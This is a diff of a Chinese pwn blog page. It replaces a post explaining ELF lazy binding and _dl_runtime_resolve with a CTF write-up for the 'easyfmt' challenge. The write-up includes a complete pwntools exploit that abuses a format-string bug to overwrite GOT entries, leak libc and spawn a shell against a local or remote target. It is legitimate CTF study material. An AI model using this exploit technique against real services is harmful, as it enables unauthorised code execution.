@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>_dl_runtime_resolve函数过程 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" 延迟绑定 ">
-  <meta name="description" content="_dl_runtime_resolve函数过程 | sixpar&#39;s blog">
+  <title>攻防世界pwn进阶-easyfmt | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" 格式化字串 ">
+  <meta name="description" content="攻防世界pwn进阶-easyfmt | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -604,9 +604,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-dl-runtime-resolve函数过程" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-攻防世界pwn进阶-easyfmt" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">_dl_runtime_resolve函数过程</h1>
+        <h1 class="article-title">攻防世界pwn进阶-easyfmt</h1>
     
     <div class="article-meta">
         
@@ -616,7 +616,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="笔记">笔记</a>
+            <a  data-rel="PWN题">PWN题</a>
             
         </span>
         
@@ -624,19 +624,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">延迟绑定</a>
+            <a class="color1">格式化字串</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-09 10:02:32'>2020-07-09 10:01</time>
+            Created At : <time class="date" title='Updated At: 2020-07-16 22:58:19'>2020-07-16 22:24</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:2k</span>
+        <span>Count:734</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -666,7 +666,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#延迟绑定："><span class="toc-text">延迟绑定：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dl-runtime-resolve函数运行过程："><span class="toc-text">_dl_runtime_resolve函数运行过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#具体流程："><span class="toc-text">具体流程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于动态链接的关键section："><span class="toc-text">关于动态链接的关键section：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dynamic："><span class="toc-text">.dynamic：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dynsym："><span class="toc-text">.dynsym：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dynstr："><span class="toc-text">.dynstr：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rel-plt"><span class="toc-text">.rel.plt:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制："><span class="toc-text">保护机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序："><span class="toc-text">分析程序：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -682,130 +682,82 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="延迟绑定："><a href="#延迟绑定：" class="headerlink" title="延迟绑定："></a>延迟绑定：</h2><p>我们知道在Linux中如果程序想要调用其他动态链接库的函数，必须要在程序加载的时候动态链接；</p>
-<p>在一个程序运行过程中，可能很多函数在程序执行完时都不会用到，比如一些错误处理函数或者一些用户很少用到的功能模块；并且如果可执行文件调用的动态库函数很多时，那在进程初始化时都对这些函数做地址解析和重定位工作的话，会大大增加进程的启动时间。<br>所以ELF采用一种叫做<code>延迟绑定</code>(Lazy Binding)的做法，只有动态库函数在被调用时，才会地址解析和重定位工作。基本思想就是当函数第一次被调用的时候才进行绑定(符号查找、重定位等)；</p>
-<p>运用到延迟绑定的场景有：</p>
-<ol>
-<li>fork之后父子进程内存的写时拷贝机制</li>
-<li>Linux用户态内存空间分配与物理内存分配机制</li>
-<li>C++库的string类写时拷贝机制</li>
-<li>动态链中的延迟重定位机制</li>
-</ol>
-<p>而在Linux 中是利用 <code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>函数来对动态链接的函数进行重定位的；</p>
-<h2 id="dl-runtime-resolve函数运行过程："><a href="#dl-runtime-resolve函数运行过程：" class="headerlink" title="_dl_runtime_resolve函数运行过程："></a>_dl_runtime_resolve函数运行过程：</h2><p>首先总的来说一下_dl_runtime_resolve函数如何使程序第一次调用一个函数：</p>
+        <h2 id="保护机制："><a href="#保护机制：" class="headerlink" title="保护机制："></a>保护机制：</h2><pre><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)</code></pre><p>开了canary和NX，部分打开RELRO，没开PIE，所以可以尝试固定套路：覆盖got表</p>
+<h2 id="分析程序："><a href="#分析程序：" class="headerlink" title="分析程序："></a>分析程序：</h2><p>找到格式化字符串漏洞：</p>
 <blockquote>
-<p>1.首先用link_map访问.dynamic，分别取出.dynstr、 .dynsym、 .rel.plt的地址；<br>2..rel.plt + 参数reloc_index,求出当前函数的重定位表项Elf32_Rel的指针，记作rel;<br>3.rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym;<br>4..dynstr + sym-&gt;st_name得出符号名字符串指针;<br>5.在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表;<br>6.最后调用这个函数；</p>
+<p>printf(&amp;buf, &amp;buf, argv);</p>
 </blockquote>
-<h3 id="具体流程："><a href="#具体流程：" class="headerlink" title="具体流程："></a>具体流程：</h3><p>以XDCTF2015的pwn200中的strlen函数为例。<br>我们想要在strlen函数处下断点，则需要找到call strlen 汇编代码处：</p>
-<blockquote>
-<p>objdump -d bof | grep call</p>
-</blockquote>
-<p>得到</p>
-<pre><code class="c"> 804835c:    e8 bf 00 00 00           call   8048420 &lt;__x86.get_pc_thunk.bx&gt;
- 8048371:    e8 6a 00 00 00           call   80483e0 &lt;write@plt+0x10&gt;
- 804840c:    e8 af ff ff ff           call   80483c0 &lt;__libc_start_main@plt&gt;
- 8048453:    ff d0                    call   *%eax
- 804848d:    ff d2                    call   *%edx
- 80484af:    e8 7c ff ff ff           call   8048430 &lt;deregister_tm_clones&gt;
- 80484e0:    ff d2                    call   *%edx
- 80484fe:    e8 8d fe ff ff           call   8048390 &lt;setbuf@plt&gt;
- 8048514:    e8 87 fe ff ff           call   80483a0 &lt;read@plt&gt;
- 8048579:    e8 12 fe ff ff           call   8048390 &lt;setbuf@plt&gt;
- 8048588:    e8 23 fe ff ff           call   80483b0 &lt;strlen@plt&gt;
- 804859a:    e8 31 fe ff ff           call   80483d0 &lt;write@plt&gt;
- 80485a2:    e8 44 ff ff ff           call   80484eb &lt;vuln&gt;
- 80485c4:    e8 57 fe ff ff           call   8048420 &lt;__x86.get_pc_thunk.bx&gt;
- 80485dc:    e8 77 fd ff ff           call   8048358 &lt;_init&gt;
- 8048604:    ff 94 bb 08 ff ff ff     call   *-0xf8(%ebx,%edi,4)
- 8048628:    e8 f3 fd ff ff           call   8048420 &lt;__x86.get_pc_thunk.bx&gt;</code></pre>
-<p>可以得知 call strlen@plt 地址为 0x8048588</p>
-<p>gdb调试，在0x8048588处下断点，然后 si 单步步入 call strlen@plt</p>
-<p>我们看到程序没有直接转到strlen函数，而是jmp到0x804a014 (GOT表)</p>
-<pre><code class="c">=&gt;  0x80483b0 &lt;strlen@plt&gt;:    jmp    DWORD PTR ds:0x804a014   //jmp到0x804a014
-    0x80483b6 &lt;strlen@plt+6&gt;:    push   0x10
-    0x80483bb &lt;strlen@plt+11&gt;:    jmp    0x8048380</code></pre>
-<p>我们查看一下0x804a014存的是什么内容：</p>
-<pre><code class="c">gdb-peda$ x/x 0x804a014
-0x804a014:    0x080483b6</code></pre>
-<p>由于0x804a014中存的是 0x080483b6(即当前指令的下一条)，所以jmp到0x804a014后又回到当前指令的下一条继续执行。即执行 push 0x10<br>push 0x10入栈后，就jmp 到 0x8048380 （公共plt表项地址）</p>
-<pre><code class="c">=&gt; 0x8048380:    push   DWORD PTR ds:0x804a004
-   0x8048386:    jmp    DWORD PTR ds:0x804a008</code></pre>
-<p>可以看到又push了0x804a004入栈。<br>之后查看一下0x804a004：</p>
-<pre><code class="c">gdb-peda$ x/x 0x804a004
-0x804a004:    0xf7ffd918</code></pre>
-<p>然后jmp到 0x804a008 （这里就是dl_runtime_resolve的地址）</p>
-<p>总之上面流程中 不停jmp，然后push了一些参数，最终跳转到了_dl_runtime_resolve函数。</p>
-<p>回观之前的操作，我们在自己的plt表项中push了0x10,又在公共plt表项中push了0x804a004，这两个东西就是dl_runtime_resolve的两个参数。<br>现在：<br>reloc_arg  —-&gt;  0x10<br>link_map   —-&gt;  0xf7ffd918</p>
-<blockquote>
-<p>_dl_runtime_resolve(link_map, reloc_arg)</p>
-</blockquote>
-<p>到现在还只是第一步。</p>
-<p>接下来，通过link_map地址我们就可知晓 .dynamic 地址：</p>
-<pre><code class="c">gdb-peda$ x/10wx 0xf7ffd918
-0xf7ffd918:    0x00000000    0xf7ffdc04    0x08049f14    0xf7ffdc08</code></pre>
-<p>得到的第三个地址–0x08049f14  就是 .dynamic 地址<br>然后<br>再通过.dynamic地址我们可以找到 .dynstr /  .dynsym /  .rel.plt  地址：</p>
-<pre><code class="c">gdb-peda$ x/40wx 0x08049f14
-0x8049f14:    0x00000001    0x00000001    0x0000000c    0x08048358
-0x8049f24:    0x0000000d    0x08048624    0x00000019    0x08049f08
-0x8049f34:    0x0000001b    0x00000004    0x0000001a    0x08049f0c
-0x8049f44:    0x0000001c    0x00000004    0x6ffffef5    0x080481ac
-0x8049f54:    0x00000005    0x08048278    0x00000006    0x080481d8
-0x8049f64:    0x0000000a    0x0000006b    0x0000000b    0x00000010
-0x8049f74:    0x00000015    0xf7ffd904    0x00000003    0x0804a000
-0x8049f84:    0x00000002    0x00000028    0x00000014    0x00000011
-0x8049f94:    0x00000017    0x08048330    0x00000011    0x08048318
-0x8049fa4:    0x00000012    0x00000018    0x00000013    0x00000008</code></pre>
-<p>.dynamic地址偏移0x44的位置（.dynamic + 0x44 =0x8049f58）存储着.dynstr的地址：<br>.dynstr ==&gt; 0x08048278</p>
-<p>.dynamic地址偏移0x4c的位置（.dynamic + 0x4c =0x4c）存储着.dynsym的地址：<br>.dynsym ==&gt; 0x080481d8</p>
-<p>.dynamic地址偏移0x84的位置（.dynamic + 0x84 =0x8049f98）存储着.rel.plt的地址：<br>.rel.plt ==&gt; 0x08048330</p>
-<p>因此可得：<br>ELF32_Rel  = .rel.plt + reloc_arg = 0x08048330 + 0x10 = 0x8048340    ,记作rel<br>通过rel可得到两个信息：</p>
-<pre><code class="c">gdb-peda$ x/10x 0x8048340
-0x8048340:    0x0804a014    0x00000407    0x0804a018    0x00000507</code></pre>
-<p>0x8048340这一行的前两个地址，第一个地址即为r_offset ,第二个地址为 r_info<br>所以：<br>r_offset ===&gt; 0x804a014   //指向GOT表的指针<br>r_info ===&gt; 0x00000407</p>
-<p>再将r_info 右移8：<br>0x407 &gt;&gt; 8   ，结果得到4 ,作为 .dynsym 的下标，即.dynsym[4]</p>
-<pre><code class="c">gdb-peda$ x/30x 0x080481d8
-0x80481d8:    0x00000000    0x00000000    0x00000000    0x00000000   //.dynsym[0]
-0x80481e8:    0x00000033    0x00000000    0x00000000    0x00000012   //.dynsym[1]
-0x80481f8:    0x00000027    0x00000000    0x00000000    0x00000012   //.dynsym[2]
-0x8048208:    0x00000052    0x00000000    0x00000000    0x00000020   //.dynsym[3]
-0x8048218:    0x00000020    0x00000000    0x00000000    0x00000012   //.dynsym[4]</code></pre>
-<p>在下标为4即.dynsym[4]处得到函数名称的偏移： name_offset = 0x20</p>
-<p>然后 st_name  = .dynstr + name_offset = 0x08048278 + 0x20 = 0x8048298<br>st_name为符号字符串名</p>
-<p>查看st_name地址：</p>
-<pre><code class="c">gdb-peda$ x/s 0x8048298
-0x8048298:    &quot;strlen&quot;</code></pre>
-<p>这样就找到了strlen函数的字符串名。</p>
-<p>最后，在动态链接库查找这个函数的地址即可，并把地址赋给 *rel -&gt; offset ，即GOT表</p>
-<p>以上便是dl_runtime_resolve 函数解析的工作原理。实际上它是通过最后的 st_name 来确定执行那一个函数的。</p>
-<h2 id="关于动态链接的关键section："><a href="#关于动态链接的关键section：" class="headerlink" title="关于动态链接的关键section："></a>关于动态链接的关键section：</h2><h3 id="dynamic："><a href="#dynamic：" class="headerlink" title=".dynamic："></a>.dynamic：</h3><p>dynamic一般保存了ELF文件依赖于哪些动态库,动态符号节信息,动态符号节信息;<br>.dynamic是GOT表的第一项；而GOT表的第二项是link_map的地址，第三项是_dl_runtime_resolve函数的地址，第四项开始才是函数的GOT表;</p>
-<h3 id="dynsym："><a href="#dynsym：" class="headerlink" title=".dynsym："></a>.dynsym：</h3><p>查看.dynsym基地址和内容：</p>
-<blockquote>
-<p>objdump -s -j .dynsym ./filename </p>
-</blockquote>
-<p>动态链接的 ELF 文件具有专门的动态符号表，其使用的结构就是 Elf32_Sym，但是其存储的节为 .dynsym<br>结构体中的域有：</p>
-<pre><code class="c">Elf32_Word    st_name; //是相对于.dynstr段开始的偏移值，那里有这个符号名字的字符串。
-Elf32_Addr    st_value;//如果该符号被导出，则存有这个导出函数的虚拟地址，否则为NULL
-unsigned char st_info; //对于导入函数符号而言，它是0x12</code></pre>
-<p>.dynsym 是运行时所需的，ELF 文件中 export/import 的符号信息全在这里</p>
-<h3 id="dynstr："><a href="#dynstr：" class="headerlink" title=".dynstr："></a>.dynstr：</h3><p>查看.dynstr基地址和内容：</p>
-<blockquote>
-<p>objdump -s -j .dynstr ./filename </p>
-</blockquote>
-<p>此节区包含用于动态链接的字符串，大多数情况下这些字符串代表了与符号表项相关的名称；</p>
-<h3 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt:"></a>.rel.plt:</h3><p>查看.rel.plt基地址和内容:</p>
-<blockquote>
-<p>objdump -s -j .rel.plt ./filename </p>
-</blockquote>
-<p>这里是重定位表，也是一个结构体数组，每个项对应一个导入函数；<br>结构体中的域有：</p>
-<pre><code class="c">  Elf32_Addr    r_offset;   //这个值就是got表的虚拟地址 ,存储的是重定位解析后的符号地址被写入内存中的位置 （绝对地址）
-  Elf32_Word    r_info;     //.dynsym节区符号表索引 ,此域的高位3字节作为一个无符号的下标，表示这个符号在 .dynsym段中的位置。</code></pre>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><pre><code class="c">.rel.plt 节   函数重定位
-.rel.dyn 节 变量重定位
-.got节 保存全局变量偏移表
-.got.plt 节 保存全局函数偏移表    ，.got.plt对应着ELF32_REL结构中的r_offset的值
-.dynsym 节 包含了动态链接符号表
-.dynstr 节包含了动态链接的字符串   ，这个节以\x00作为开始和结尾，中间每个字符串也以\x00间隔
-.plt 节 是过程链接表，把位置独立的函数调用重定向到绝对位置</code></pre>
+<p>但是要想利用这个漏洞之前要经历一个 Checkin 函数。<br>该函数会产生1位随机数，我们要输入正确才能通过验证继续执行程序。<br>不就爆破嘛，1/10的概率。我们干脆取’1’好了。</p>
+<p>可以看到程序在一次输入输出之后就exit退出了。这可不行，我们得循环利用才行，不能只执行一遍就退出。<br>所以尝试修改exit函数，把exit的函数地址修改为 0x400982 （Checkin函数的下一句指令）</p>
+<pre><code class="c">.text:0000000000400978                 call    CheckIn
+.text:000000000040097D                 cmp     eax, 1
+.text:0000000000400980                 jnz     short loc_4009E4
+.text:0000000000400982                 lea     rdx, [rbp+buf]
+.text:0000000000400989                 mov     eax, 0</code></pre>
+<p>可以看到978-980的位置都是Checkin函数的波及范围，为了避开恶心的检测，所以我们令exit地址为0x400982。<br>即当程序退出时，又可以跳到0x400982处再执行一遍程序。</p>
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><pre><code class="python">#coding:utf-8
+from pwn import *
+
+local = 1
+if local:
+    p = process(&#39;./easyfmt&#39;)
+else:
+    p = remote(&#39;220.249.52.133&#39;,54862 )
+
+debug = 1
+if debug:
+    context.log_level = &#39;debug&#39;
+
+libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+elf = ELF(&#39;./easyfmt&#39;)
+p.sendlineafter(&#39;enter:&#39;, &#39;1&#39;)
+
+#在slogan处输入： aaaaaaaa%8$p
+#将得到 aaaaaaaa0x6161616161616161
+#所以得知输入的偏移为8
+p.recvuntil(&#39;slogan: &#39;)
+payload = &#39;%&#39; + str(0x982) + &#39;c%10$hn&#39;   
+#修改exit地址的后两个字节，使得exit退出时跳转到0x400982，即checkin函数的下一句
+#躲开恶心的checkin函数，继续循环程序
+payload = payload.ljust(16, &#39;a&#39;)
+payload += p64(elf.got[&#39;exit&#39;])
+p.sendline(payload)
+#gdb.attach(p)
+#pause()
+
+p.recvuntil(&#39;slogan: &#39;)
+payload = &#39;%10$sAAA&#39; + p64(elf.got[&#39;read&#39;])  #输入的偏移不知道为什么变为9了
+# len(&#39;%10$sAAA&#39;)= 8字节
+# 其中的AAA是起到补齐8字节的作用
+# 所以read的got地址就是处在偏移为10的地方（9+1）
+#我们把偏移为10的地方的内容打印出来，即泄漏了read的got地址
+p.sendline(payload)
+#p.interactive()
+#gdb.attach(p)
+p.recv(1)
+read_addr = u64(p.recvuntil(&#39;AAA&#39;, drop = True).ljust(8,&#39;\x00&#39;))
+print hex(read_addr)
+
+libcbase = read_addr - libc.symbols[&#39;read&#39;]
+system = libc.symbols[&#39;system&#39;] + libcbase
+
+#修改printf的got表，只需修改低3字节即可到system 
+data = (system&amp;0xFF)
+payload = &#39;%&#39; + str(data) + &#39;c%14$hhn&#39;
+data = ((system&amp;0xFFFFFF) &gt;&gt; 8) - data
+payload += &#39;%&#39; + str(data) + &#39;c%15$hn&#39;
+payload = payload.ljust(32, &#39;A&#39;)
+payload += p64(elf.got[&#39;printf&#39;]) + p64(elf.got[&#39;printf&#39;] + 1)
+p.recvuntil(&#39;slogan: &#39;)
+p.sendline(payload)
+
+p.sendlineafter(&#39;slogan: &#39;,&#39;/bin/sh&#39;)
+p.interactive()</code></pre>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>看exp应该就能懂。主要还是通过格式化字符串漏洞任意地址写。<br>我困了，今天背单词的时候就两眼迷离，晚上还是要早点睡比较好啊…..<br>(¦3[▓▓] 晚安</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
